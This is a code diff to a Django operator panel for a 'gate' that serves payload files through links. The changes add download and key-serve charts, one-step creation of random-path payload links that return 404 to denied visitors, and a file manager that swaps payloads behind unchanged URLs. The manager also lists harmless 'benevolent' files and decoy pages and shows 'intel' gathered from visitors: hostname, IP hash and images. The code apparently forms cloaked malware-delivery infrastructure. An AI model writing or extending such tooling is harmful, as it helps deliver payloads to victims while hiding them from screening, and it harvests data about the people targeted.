@@ -141,12 +141,101 @@ def _link_from_post(request, link):
 
 @login_required
 def link_detail(request, pk):
+    from datetime import timedelta
     link = get_object_or_404(DeliveryLink, pk=pk)
     submissions = link.submissions.select_related("decided_by")[:20]
+    # 14-day release series for the payload chart (downloads + key serves only,
+    # not the generic per-visit "hit" records)
+    since = timezone.now() - timedelta(days=14)
+    hits = link.hit_events.filter(created_at__gte=since, category__in=["download", "key_served"])
+    from django.db.models import Count
+    from django.db.models.functions import TruncDate
+    daily = {str(item["day"]): item["count"] for item in
+             hits.annotate(day=TruncDate("created_at")).values("day").annotate(count=Count("id"))}
+    series = []
+    now = timezone.now()
+    for offset in range(13, -1, -1):
+        day = (now - timedelta(days=offset)).date().isoformat()
+        series.append({"day": day, "count": daily.get(day, 0)})
     return render(request, "panel/link_detail.html", {
         "title": f"Link {link.path}", "link": link, "submissions": submissions,
         "hits": link.hit_events.all()[:30], "is_administrator": is_administrator(request.user),
-        "undo_seconds": services_undo_window(),
+        "undo_seconds": services_undo_window(), "series_json": series,
+    })
+
+
+@login_required
+@transaction.atomic
+def link_quick_drop(request):
+    """One-step file drop: name + file -> a live download link with an
+    auto-generated path under the gate base. Returns JSON for the modal."""
+    import secrets
+    if request.method != "POST":
+        return JsonResponse({"detail": "POST only."}, status=405)
+    file = request.FILES.get("file")
+    if not file:
+        return JsonResponse({"detail": "Attach a file."}, status=400)
+    base = _base_path()
+    path = f"{base}{secrets.token_urlsafe(6)}"
+    link = DeliveryLink.objects.create(
+        path=path, kind="file", label=request.POST.get("name", "").strip()[:120] or file.name[:120],
+        placeholder="blank", on_deny="not_found", payload=file, created_by=request.user,
+    )
+    record_event(action="gate.link_quick_dropped", actor=request.user, target=link,
+                 metadata={"size": file.size}, request=request)
+    return JsonResponse({"path": link.path, "label": link.label, "id": link.pk})
+
+
+@login_required
+def payloads_view(request):
+    """File manager: every payload, benevolent file, and decoy page, with the
+    gate intel (submissions) attached to each link."""
+    if request.method == "POST":
+        action = request.POST.get("action", "")
+        link = get_object_or_404(DeliveryLink, pk=request.POST.get("link_id", ""))
+        if action == "replace" and request.FILES.get("payload"):
+            old_name = link.payload.name if link.payload else ""
+            link.payload = request.FILES["payload"]
+            link.save(update_fields=["payload"])
+            record_event(action="gate.payload_rotated", actor=request.user, target=link,
+                         metadata={"old": old_name}, request=request)
+            messages.success(request, f"Payload on {link.path} replaced; the URL is unchanged.")
+        elif action == "clear":
+            if link.payload:
+                link.payload.delete(save=False)
+                link.payload = None
+                link.save(update_fields=["payload"])
+                record_event(action="gate.payload_cleared", actor=request.user, target=link,
+                             request=request)
+                messages.success(request, f"Payload cleared from {link.path}.")
+        elif action == "clear_benevolent":
+            if link.benevolent_file:
+                link.benevolent_file.delete(save=False)
+                link.benevolent_file = None
+                link.save(update_fields=["benevolent_file"])
+                messages.success(request, f"Benevolent file cleared from {link.path}.")
+        return redirect("gate-payloads")
+    file_links = DeliveryLink.objects.filter(payload__isnull=False).exclude(payload="")
+    benevolent_links = DeliveryLink.objects.filter(benevolent_file__isnull=False).exclude(benevolent_file="")
+    decoys = DecoyPage.objects.filter(kind="upload", html_file__isnull=False).exclude(html_file="")
+    intel = {}
+    for link in list(file_links) + list(benevolent_links):
+        submissions = link.submissions.all()
+        if submissions.exists():
+            latest = submissions.first()
+            intel[link.pk] = {
+                "count": submissions.count(),
+                "hostname": (latest.decoded_json or {}).get("hostname", ""),
+                "ip_hash": latest.client_ip_hash[:12],
+                "images": latest.images.count(),
+                "at": latest.created_at,
+            }
+    return render(request, "panel/payloads.html", {
+        "title": "Payloads",
+        "file_links": file_links,
+        "benevolent_links": benevolent_links,
+        "decoys": decoys,
+        "intel": intel,
     })
 
 
